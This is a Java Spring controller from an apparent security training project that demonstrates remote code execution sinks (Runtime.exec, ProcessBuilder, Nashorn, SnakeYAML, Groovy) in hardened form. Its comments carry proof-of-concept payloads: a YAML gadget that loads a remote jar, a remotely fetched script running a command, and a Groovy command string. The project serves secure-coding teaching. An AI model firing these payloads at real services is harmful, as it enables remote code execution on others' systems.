package org.joychou.controller;

import groovy.lang.GroovyShell;
import jdk.nashorn.api.scripting.ClassFilter;
import jdk.nashorn.api.scripting.NashornScriptEngineFactory;
import lombok.extern.slf4j.Slf4j;
import org.codehaus.groovy.ast.expr.BinaryExpression;
import org.codehaus.groovy.ast.expr.ConstantExpression;
import org.codehaus.groovy.ast.expr.Expression;
import org.codehaus.groovy.ast.stmt.BlockStatement;
import org.codehaus.groovy.ast.stmt.ExpressionStatement;
import org.codehaus.groovy.ast.stmt.ReturnStatement;
import org.codehaus.groovy.ast.stmt.Statement;
import org.codehaus.groovy.control.CompilerConfiguration;
import org.codehaus.groovy.control.customizers.SecureASTCustomizer;
import org.codehaus.groovy.syntax.Types;
import org.joychou.security.SecurityUtil;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.constructor.SafeConstructor;

import javax.script.Bindings;
import javax.script.ScriptContext;
import javax.script.ScriptEngine;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.Arrays;
import java.util.Collections;
import java.util.List;
import java.util.regex.Pattern;


/**
 * Java code execute
 *
 * @author JoyChou @ 2018-05-24
 */
@Slf4j
@RestController
@RequestMapping("/rce")
public class Rce {

    private static final Pattern JS_URL_PATTERN = Pattern.compile("^https?://[a-zA-Z0-9._~:/?#\\[\\]@!$&()*+,;=%-]+$");

    @GetMapping("/runtime/exec")
    public String CommandExec(String cmd) {
        Runtime run = Runtime.getRuntime();
        StringBuilder sb = new StringBuilder();

        // Allowlisted executable + plain arguments, executed as argv (no shell, no string tokenizing of raw input).
        List<String> argv = SecurityUtil.safeCommand(cmd);
        if (argv == null) {
            return "Bad boy. I got u.";
        }

        try {
            Process p = run.exec(argv.toArray(new String[0]));
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }

            if (p.waitFor() != 0) {
                if (p.exitValue() == 1)
                    return "Command exec failed!!";
            }

            inBr.close();
            in.close();
        } catch (Exception e) {
            return e.toString();
        }
        return sb.toString();
    }


    /**
     * <a href="http://localhost:8080/rce/ProcessBuilder?cmd=whoami">POC</a>
     */
    @GetMapping("/ProcessBuilder")
    public String processBuilder(String cmd) {

        StringBuilder sb = new StringBuilder();

        // No shell: allowlisted executable + plain arguments passed as argv.
        List<String> arrCmd = SecurityUtil.safeCommand(cmd);
        if (arrCmd == null) {
            return "Bad boy. I got u.";
        }

        try {
            ProcessBuilder processBuilder = new ProcessBuilder(arrCmd);
            Process p = processBuilder.start();
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }
        } catch (Exception e) {
            return e.toString();
        }

        return sb.toString();
    }


    /**
     * http://localhost:8080/rce/jscmd?jsurl=http://xx.yy/zz.js
     *
     * curl http://xx.yy/zz.js
     * var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec("open -a Calculator");}
     *
     * @param jsurl js url
     */
    @GetMapping("/jscmd")
    public void jsEngine(String jsurl) throws Exception{
        // Only load scripts from allowlisted domains, and never allow quote/escape chars to break out of the load() literal.
        if (SecurityUtil.checkURL(jsurl) == null || !JS_URL_PATTERN.matcher(jsurl).matches()) {
            throw new IllegalArgumentException("jsurl is not allowed");
        }
        // js nashorn javascript ecmascript; the ClassFilter denies scripts access to every Java class
        // (java.lang.Runtime, ProcessBuilder, ...), so the script cannot execute commands.
        ScriptEngine engine = new NashornScriptEngineFactory().getScriptEngine(new ClassFilter() {
            @Override
            public boolean exposeToScripts(String className) {
                return false;
            }
        });
        Bindings bindings = engine.getBindings(ScriptContext.ENGINE_SCOPE);
        String cmd = String.format("load(\"%s\")", jsurl);
        engine.eval(cmd, bindings);
    }


    /**
     * http://localhost:8080/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager%20[!!java.net.URLClassLoader%20[[!!java.net.URL%20[%22http://test.joychou.org:8086/yaml-payload.jar%22]]]]
     * yaml-payload.jar: https://github.com/artsploit/yaml-payload
     *
     * @param content payloads
     */
    @GetMapping("/vuln/yarm")
    public void yarm(String content) {
        // SafeConstructor only builds standard YAML types (no arbitrary class instantiation).
        Yaml y = new Yaml(new SafeConstructor());
        y.load(content);
    }

    @GetMapping("/sec/yarm")
    public void secYarm(String content) {
        Yaml y = new Yaml(new SafeConstructor());
        y.load(content);
    }

    /**
     * http://localhost:8080/rce/groovy?content="open -a Calculator".execute()
     * @param content groovy shell
     */
    @GetMapping("groovy")
    public void groovyshell(String content) {
        // Sandbox: only literals and basic arithmetic/comparison are compiled; method calls, property access,
        // imports, class/closure definitions, etc. are rejected at compile time.
        SecureASTCustomizer secure = new SecureASTCustomizer();
        secure.setClosuresAllowed(false);
        secure.setMethodDefinitionAllowed(false);
        secure.setPackageAllowed(false);
        secure.setIndirectImportCheckEnabled(true);
        secure.setAllowedImports(Collections.<String>emptyList());
        secure.setAllowedStarImports(Collections.<String>emptyList());
        secure.setAllowedStaticImports(Collections.<String>emptyList());
        secure.setAllowedStaticStarImports(Collections.<String>emptyList());
        secure.setAllowedStatements(Arrays.<Class<? extends Statement>>asList(
                BlockStatement.class, ExpressionStatement.class, ReturnStatement.class));
        secure.setAllowedExpressions(Arrays.<Class<? extends Expression>>asList(
                ConstantExpression.class, BinaryExpression.class));
        secure.setAllowedTokens(Arrays.asList(
                Types.PLUS, Types.MINUS, Types.MULTIPLY, Types.DIVIDE, Types.MOD,
                Types.COMPARE_EQUAL, Types.COMPARE_NOT_EQUAL, Types.COMPARE_LESS_THAN,
                Types.COMPARE_LESS_THAN_EQUAL, Types.COMPARE_GREATER_THAN, Types.COMPARE_GREATER_THAN_EQUAL));
        CompilerConfiguration config = new CompilerConfiguration();
        config.addCompilationCustomizers(secure);
        GroovyShell groovyShell = new GroovyShell(config);
        groovyShell.evaluate(content);
    }



    public static void main(String[] args) throws Exception{
        Runtime.getRuntime().exec("touch /tmp/x");
    }
}

